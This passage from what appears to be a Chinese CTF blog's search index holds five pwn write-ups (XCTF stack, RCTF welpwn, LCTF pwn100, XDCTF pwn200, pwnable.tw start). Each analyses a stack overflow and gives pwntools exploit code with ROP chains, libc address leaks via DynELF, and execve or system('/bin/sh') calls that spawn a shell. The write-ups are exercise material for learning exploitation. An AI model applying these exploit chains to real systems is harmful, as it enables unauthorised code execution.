    <url>%2F2018%2F02%2F02%2Fcyberearth-xctf-pwn-stack%2F</url>
    <content type="text"><![CDATA[第一次和大佬们一起参加CTF比赛，在pwn中选了一个栈溢出的题目来做。 先丢到ida中，如其名“跑马灯”，程序会在跑完三轮跑马灯前的最后一次，设置一个定时器并在2秒后触发进入死循环handler。在跑马灯结束到触发alarm之前，有一个窗口可以提供输入。 1234signal(14, (__sighandler_t)handler);alarm(2u);//......return gee(); 提供输入在gee函数内，buf长度为0x88，read读入上限为0x100，可以溢出，offset为140。 123char buf; // [esp+0h] [ebp-88h]puts("*...........................................................");return read(0, &amp;buf, 0x100u); // buf length 0x88 overflow 通过简单的实验可知，先前的signal和alarm可以被后来的signal和alarm所覆盖，因此首先通过溢出令alarm(2u)失效。 12345678910# waitprint p.recvuntil('*...........................................................')print p.recvuntil('*...........................................................')print p.recvuntil('*...........................................................')print p.recvuntil('*...........................................................')# disable alarm# 0x8048b5e call geepayload = 'a' * 140 + p32(alarm_plt) + p32(0x8048b5e) + p32(0)p.sendline(payload) 编写leak函数并进行泄漏： 123456789101112131415def leak(addr): payload = 'a' * 140 + p32(write_plt) + p32(0x8048b5e) + p32(1) + p32(addr) + p32(4) print p.recvuntil('...\n') p.send(payload) data = p.recv(4) # print data return datad = DynELF(leak, elf=ELF('./stack'), libcdb=False)execve_addr = d.lookup('execve', 'libc')print 'execve:' + hex(execve_addr)system_addr = d.lookup('system', 'libc')print 'system:' + hex(system_addr)libcbase_addr = d.bases()['/lib/i386-linux-gnu/libc.so.6']print 'libc base addr:' + hex(libcbase_addr) 在实际做题中，可以根据泄漏的函数地址找到对应的libc版本从而获取/bin/sh的偏移地址，由于没有环境，故直接导入本地libc。曾经尝试调用system并通过read读入/bin/sh字符串，但失败（包括先调用start恢复栈帧）。 1234libc = ELF('./libc.so.6')binsh_offset = next(libc.search('/bin/sh'))print '/bin/sh offset:' + hex(binsh_offset)binsh_addr = libcbase_addr + binsh_offset 调用execve即可拿到shell： 1234payload = 'a' * 140 + p32(execve_addr) + p32(0xdeadbeef) + p32(binsh_addr) + p32(0) + p32(0)p.send(payload)p.interactive()p.close()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>xctf</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rctf 2015 welpwn writeup]]></title>
    <url>%2F2018%2F01%2F09%2Frctf15-welpwn%2F</url>
    <content type="text"><![CDATA[buf的空间大小为0x400，read()的读入长度也为0x400。进入echo()函数继续查找。 字符串s2长度为0x10，内容从buf进行拷贝，当遇到\x00时特，停止拷贝。栈布局如下 size data 0x10 s2 0x08 saved ebp 0x08 return address 0x400 buf 构造如下payload：1payload = 'a' * 24 + return_addr 由于字符串复制遇\x00终止，因此最多只能传入一个地址。但由于返回地址之后就是我们所输入的buf，所以需要利用buf进行控制。buf的前32字节为上述payload，因此需要利用gadget从栈中移除32字节，使用pop四次返回即可，随后便进入预先设计好的控制流中。由于原先的返回地址非\x00长度与pop4_addr相同，因此可以成功写入。leak函数设计如下： 12345678910def leak(addr): payload = 'a' * 24 + p64(pop4_addr) payload += p64(pop6_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(addr) + p64(1) payload += p64(call_addr) + 'a' * 56 payload += p64(start_addr) payload = payload.ljust(0x400, 'a') p.send(payload) data = p.recv(8) p.recv(0x400) return data 获取system地址后： 12345678payload = 'a' * 24 + p64(pop4_addr)payload += p64(pop6_addr) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(bss_addr) + p64(0)payload += p64(call_addr) + 'a' * 56payload += p64(poprdi_addr) + p64(bss_addr) + p64(system_addr)payload = payload.ljust(0x400, 'a')p.send(payload)p.send('/bin/sh\x00')p.interactive() 参考文章和bin下载：https://www.anquanke.com/post/id/85129]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>rctf</tag>
        <tag>2015</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lctf 2016 pwn100 writeup]]></title>
    <url>%2F2018%2F01%2F07%2Flctf16-pwn100%2F</url>
    <content type="text"><![CDATA[使用ida查看程序，在函数0x40063d中有read函数，读取用户输入的200个字节。接着调用puts函数输出。 12sub_40063D((__int64)&amp;v1, 200);return puts("bye~"); 存储用户输入的空间为0x40字节，所以用户输入会导致溢出。由于是64位程序，因此需要gadget来控制流。x64中，主要使用__libc_csu_init中的两段代码来进行参数传递和函数调用，这两段代码分别位于0x400740和0x40075a。 由于无libc，需要泄漏，通过pattern和rsp可知偏移为72： 123456789101112131415161718def leak(addr): payload = 'a' * 72 + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_addr) payload += 'a' * (200 - len(payload)) p.send(payload) p.recvuntil('~\n') prev_rv = '' data = '' while True: rv = p.recv(numb = 1, timeout = 0.1) if prev_rv == '\n' and rv == '': data = data[:-1] data += '\x00' break else: data += rv prev_rv = rv data = data[:4] return data 获取system函数地址后，只需要将/bin/sh写入再调用system函数即可，通过vmmap可知0x601000-0x602000可读/写： 1234567891011payload = 'a' * 72 + p64(0x40075a) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(0x601000) + p64(0) + p64(0x400740) #0、1两个参数固定，0配合第二段代码的call，由于是call指令第三个参数用got，随后是read函数的三个参数，返回0x400740调用第二段代码payload += 'a' * 56 + p64(start_addr) #栈指针移动了56字节，填充56字节payload += 'a' * (200 - len(payload))p.send(payload)p.recvuntil('~\n')p.send('/bin/sh\x00')payload = 'a' * 72 + p64(pop_rdi) + p64(0x601000) + p64(system_addr) + p64(0xdeadbeef)payload += 'a' * (200 - len(payload))p.send(payload)p.interactive() 参考文章和bin下载：https://www.anquanke.com/post/id/85129]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2016</tag>
        <tag>lctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xdctf 2015 pwn200 writeup]]></title>
    <url>%2F2018%2F01%2F06%2Fxdctf15-pwn200%2F</url>
    <content type="text"><![CDATA[为栈溢出，溢出点为buf，长度0x6C，read可输入0x100。溢出偏移为112。 1read(0, &amp;buf, 0x100u); // buf length: 0x6C 因为无libc，因此需要通过泄漏获取libc信息来获取system函数地址： 12345678def leak(address): payload = 'a' * 112 + p32(write_plt) + p32(0x8048484) + p32(1) + p32(address) + p32(4) # 返回到0x8048484使得泄漏可以重复 p.send(payload) data = recv(4) return datad = DynELF(leak, elf=ELF('./xdctf15-pwn200'), libcdb=False)system_addr = d.lookup('system', 'libc') 接着调用start函数恢复栈： 1payload = 'a' * 112 + p32(start_addr) 调用read函数输入”/bin/sh”字符串，最后调用system函数： 1payload = 'a' * 112 + p32(read_plt) + p32(0x804856c) + p32(0) + p32(bss_addr) + p32(8) + p32(system_addr) + p32(0xdeadbeef) + p32(bss_addr)]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>xctf</tag>
        <tag>2015</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pwnable.tw start writeup]]></title>
    <url>%2F2018%2F01%2F05%2Fpwnable-tw-start%2F</url>
    <content type="text"><![CDATA[使用ida查看程序，首先保存esp和_exit地址，随后将输出的字符串压栈： 123456789push esppush offset _exitxor eax, eax ; ebx, ecx, edxpush &apos;Let&apos;s start the CTF:&apos;mov ecx esp ; addrmov dl, 14h ; lenmov bl, 1 ; fdmov al, 4 ; syscall num, writeint 80h 随后执行输入函数： 1234xor ebx, ebx ; fdmov dl, 3Ch ; lenmov al, 3 ; syscall num, putint 80h 由于ecx在之前已经被赋值为esp，所以put函数仍是对同一个变量（输出的字符串）进行输入。使用gdb-peda的checksec查看，虽然显示NX: enable，但是通过vmmap执行，发现栈是可执行的。使用pattern create和pattern offset获取偏移量为20。因此构造的payload结构如下： 1'a' * 20 + [ret addr] + getshell 因为要获取栈的地址来达到ret2shellcode的目的，所以需要通过write泄漏栈地址。在程序运行的开始，执行了： 12push esppush offset _exit 在put函数后，执行： 12add esp, 14hret ;pop esp 使得字符串参数、_exit被移出栈、pop，栈顶从而变为之前储存的esp。因此在第一个put函数执行时，输入： 1'a' * 20 + 0x8048087 便可以打印出esp的地址。获取esp的地址后，将会继续再次执行put函数（此时ecx仍为字符串参数的地址），此时输入： 1'a' * 20 + [ret addr] + getshell 即可。需要注意shellcode长度以满足输入的条件（3Ch）。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>pwnable-tw</tag>
      </tags>
  </entry>
</search>
